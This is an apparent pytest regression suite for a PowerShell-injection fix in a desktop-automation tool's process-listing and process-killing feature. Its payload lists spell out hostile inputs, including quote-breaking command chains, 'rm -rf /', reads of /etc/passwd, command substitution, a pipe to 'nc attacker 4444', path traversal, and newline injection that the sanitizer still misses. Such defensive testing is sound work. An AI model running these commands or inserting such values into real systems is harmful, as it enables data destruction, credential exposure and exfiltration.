"""Regression tests for the PowerShell-injection fix in Process-Tool (v0.8.4).

The fix landed in commit bbd7b26 ("security: fix PowerShell injection in
Process-Tool"). Before that commit the `name` argument flowed straight into a
double-quoted PowerShell string (`Get-Process -Name "{name}"` /
`Stop-Process -Name "{name}"`), so a payload like

    x"; Stop-Process -Name explorer; "

would close the quote and chain arbitrary PowerShell. The fix routes `name`
through `_sanitize_name`, which rejects PowerShell metacharacters
(single-quote, double-quote, backtick, dollar, semicolon, pipe, ampersand,
braces, parens, slash, backslash).

These tests pin that behavior so a future refactor can't silently re-open the
hole. They:

1. Send a battery of injection payloads at action="list" and action="kill",
   assert the response is a `Security Error: ...`, and assert that
   `desktop.execute_command` is NEVER called (mock not invoked).
2. Send legitimate process names (notepad, chrome.exe, My-App, with-dash) at
   both actions, assert the call DOES reach `desktop.execute_command`, and
   assert the unsanitized argv-style call shape — there is no `shell=True`
   in this codebase (PowerShell goes through `desktop.execute_command`),
   so we just verify the literal command string contains the name and
   nothing the attacker injected.
"""

import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

sys.path.insert(0, str(Path(__file__).parent.parent))


def _make_passthrough_decorator(*args, **kwargs):
    def decorator(func):
        return func

    return decorator


_fastmcp_instance_mock = MagicMock()
_fastmcp_instance_mock.tool = _make_passthrough_decorator
_fastmcp_instance_mock.resource = _make_passthrough_decorator

_fastmcp_module_mock = MagicMock()
_fastmcp_module_mock.FastMCP.return_value = _fastmcp_instance_mock

sys.modules.setdefault("humancursor", MagicMock())
sys.modules.setdefault("humancursor.SystemCursor", MagicMock())
sys.modules.setdefault("markdownify", MagicMock())
sys.modules.setdefault("markdownify.markdownify", MagicMock())
sys.modules.setdefault("uiautomation", MagicMock())
sys.modules.setdefault("pyautogui", MagicMock())
sys.modules.setdefault("PIL", MagicMock())
sys.modules.setdefault("PIL.Image", MagicMock())
sys.modules.setdefault("fastmcp", _fastmcp_module_mock)
sys.modules.setdefault("fastmcp.utilities", MagicMock())
sys.modules.setdefault("fastmcp.utilities.types", MagicMock())

import pytest


@pytest.fixture(autouse=True)
def _mock_ensure_com():
    with patch("main.ensure_com"):
        yield


# Canonical injection-payload battery — each entry MUST be rejected by the
# v0.8.4 sanitizer. Covers quote-breaking, command chaining, subshell
# expansion, pipes, path-separator smuggling, and brace/paren smuggling.
INJECTION_PAYLOADS = [
    # PowerShell quote-breakers + chained command (the originally exploited shape)
    'x"; Stop-Process -Name explorer; "',
    'test"; Get-Process | Out-Null;',
    # POSIX-style chaining attempts
    "notepad;rm -rf /",
    "notepad && cat /etc/passwd",
    "notepad || whoami",
    # Subshell / command substitution
    "$(whoami)",
    "`whoami`",
    "${PATH}",
    # Pipe-to-attacker
    "notepad|nc attacker 4444",
    # Single-quote breaker
    "notepad'; Stop-Process -Name explorer; '",
    # Path-separator smuggling — _sanitize_name rejects \ and /
    "..\\..\\evil.exe",
    "../etc/passwd",
    # Brace / parens smuggling (PS hash-table or sub-expression)
    "notepad{Start-Process calc}",
    "notepad(Get-Process)",
]


# Payloads that the v0.8.4 sanitizer does NOT block but which deserve
# follow-up. They're listed here as xfail so we document the gap without
# turning the regression suite red. If `_sanitize_name` is later hardened to
# also reject `*`, `?`, `\n`, `\r`, flip `strict=True` and these will start
# passing — that's the signal to drop the xfail and merge them into the main
# list.
KNOWN_GAP_PAYLOADS = [
    # Glob expansion: `*` reaches PS as a literal star, not blocked here.
    "*",
    "*.exe",
    # Newline injection inside a double-quoted PS string.
    "notepad\nStop-Process -Name explorer",
    "notepad\r\ncalc",
]


# Inputs that should pass sanitization and reach desktop.execute_command.
LEGITIMATE_NAMES = [
    "notepad",
    "chrome.exe",
    "My-App",
    "powershell",
    "Code",
    "with-dash-and-numbers123",
    "x",  # single char
]


# ── action="list" with name filter ──────────────────────────────────────────


class TestProcessToolListInjection:
    """Process-Tool action='list' must reject injection payloads."""

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_injection_rejected_and_no_command_executed(self, payload):
        from main import process_tool

        with patch("main.desktop") as mock_desktop:
            result = process_tool(action="list", name=payload)

            # Must surface a Security Error (NOT a generic success message).
            assert "Security Error" in result, (
                f"Payload {payload!r} did not produce Security Error; got {result!r}"
            )
            # Critical: the underlying shell must NEVER be invoked for an
            # injection payload. If this fails, the harness is feeding
            # attacker-controlled text to PowerShell.
            mock_desktop.execute_command.assert_not_called()

    @pytest.mark.parametrize("name", LEGITIMATE_NAMES)
    def test_legitimate_name_reaches_powershell(self, name):
        from main import process_tool

        with patch("main.desktop") as mock_desktop:
            mock_desktop.execute_command.return_value = ("Process info", 0)
            result = process_tool(action="list", name=name)

            mock_desktop.execute_command.assert_called_once()
            call_args = mock_desktop.execute_command.call_args
            cmd_str = call_args.args[0] if call_args.args else call_args.kwargs.get("command", "")

            # The legitimate name must appear in the generated PowerShell.
            assert name in cmd_str, f"Expected {name!r} in command, got {cmd_str!r}"
            # And the result should not be a Security/Validation error.
            assert "Security Error" not in result
            assert "Validation Error" not in result


# ── action="kill" with name ─────────────────────────────────────────────────


class TestProcessToolKillInjection:
    """Process-Tool action='kill' must reject injection payloads."""

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_injection_rejected_and_no_command_executed(self, payload):
        from main import process_tool

        with patch("main.desktop") as mock_desktop:
            result = process_tool(action="kill", name=payload)

            assert "Security Error" in result, (
                f"Payload {payload!r} did not produce Security Error; got {result!r}"
            )
            mock_desktop.execute_command.assert_not_called()

    @pytest.mark.parametrize("name", LEGITIMATE_NAMES)
    def test_legitimate_name_reaches_powershell(self, name):
        from main import process_tool

        # Skip names that hit the BLOCKED_COMMANDS list — those have a
        # different (and still correct) rejection path.
        from main import BLOCKED_COMMANDS

        if name.lower().replace(".exe", "") in BLOCKED_COMMANDS:
            pytest.skip(f"{name} is in BLOCKED_COMMANDS")

        with patch("main.desktop") as mock_desktop:
            mock_desktop.execute_command.return_value = ("ok", 0)
            result = process_tool(action="kill", name=name)

            mock_desktop.execute_command.assert_called_once()
            call_args = mock_desktop.execute_command.call_args
            cmd_str = call_args.args[0] if call_args.args else call_args.kwargs.get("command", "")

            assert name in cmd_str
            assert "Stop-Process" in cmd_str
            assert "Security Error" not in result


# ── Direct _sanitize_name unit coverage ────────────────────────────────────


class TestSanitizeNameHelper:
    """Direct unit tests on the sanitizer that powers the fix."""

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_rejects_metacharacters(self, payload):
        from main import _sanitize_name

        with pytest.raises(ValueError, match="unsafe characters"):
            _sanitize_name(payload)

    @pytest.mark.parametrize("name", LEGITIMATE_NAMES)
    def test_accepts_legitimate_names(self, name):
        from main import _sanitize_name

        assert _sanitize_name(name) == name

    def test_accepts_unicode_word_chars(self):
        from main import _sanitize_name

        # Unicode letters in process names should not be falsely rejected.
        assert _sanitize_name("café") == "café"

    def test_accepts_space_in_name(self):
        from main import _sanitize_name

        # Process names with spaces are uncommon on Windows, but `_sanitize_name`
        # does not block spaces — verify behavior is preserved.
        assert _sanitize_name("My App") == "My App"


# ── Subprocess shape guarantees ─────────────────────────────────────────────


class TestNoShellTrueInProcessTool:
    """Process-Tool must not invoke subprocess with shell=True or string-concat
    its way into a shell. PowerShell flows through desktop.execute_command,
    which is the single bottleneck — so as long as `name` is sanitized before
    interpolation, the call is safe.

    These tests assert structural invariants of the generated command string.
    """

    def test_list_command_uses_named_quoted_form(self):
        """The list command MUST keep the -Name "<value>" quoting form. If a
        future refactor swaps to argv-style PS invocation, update this test."""
        from main import process_tool

        with patch("main.desktop") as mock_desktop:
            mock_desktop.execute_command.return_value = ("ok", 0)
            process_tool(action="list", name="notepad")

            cmd = mock_desktop.execute_command.call_args.args[0]
            assert 'Get-Process -Name "notepad"' in cmd

    def test_kill_command_uses_named_quoted_form(self):
        from main import process_tool

        with patch("main.desktop") as mock_desktop:
            mock_desktop.execute_command.return_value = ("ok", 0)
            process_tool(action="kill", name="notepad")

            cmd = mock_desktop.execute_command.call_args.args[0]
            assert 'Stop-Process -Name "notepad"' in cmd

    def test_validate_text_alone_would_not_have_caught_injection(self):
        """Documents the bug: validate_text only checks length, so the
        original code passed injection payloads straight to PowerShell.
        This test exists to fail loudly if someone deletes the
        _sanitize_name call thinking validate_text is enough."""
        from main import validate_text

        payload = 'x"; Stop-Process -Name explorer; "'
        ok, _ = validate_text(payload, max_length=200)
        assert ok is True, (
            "validate_text incorrectly rejected the injection payload; "
            "if this changes, the regression-test rationale needs updating."
        )


# ── Documented gaps (xfail) ─────────────────────────────────────────────────


class TestSanitizerKnownGaps:
    """Payloads the v0.8.4 sanitizer doesn't reject. xfail-ed so the suite
    stays green while documenting the gap. Flip these to passing by
    extending _sanitize_name's regex to also reject `*`, `?`, and
    whitespace control chars (`\\n`, `\\r`)."""

    @pytest.mark.parametrize("payload", KNOWN_GAP_PAYLOADS)
    @pytest.mark.xfail(
        reason="v0.8.4 _sanitize_name does not reject glob/newline chars; "
        "tracked as follow-up hardening.",
        strict=False,
    )
    def test_gap_payloads_should_be_rejected(self, payload):
        from main import _sanitize_name

        with pytest.raises(ValueError):
            _sanitize_name(payload)
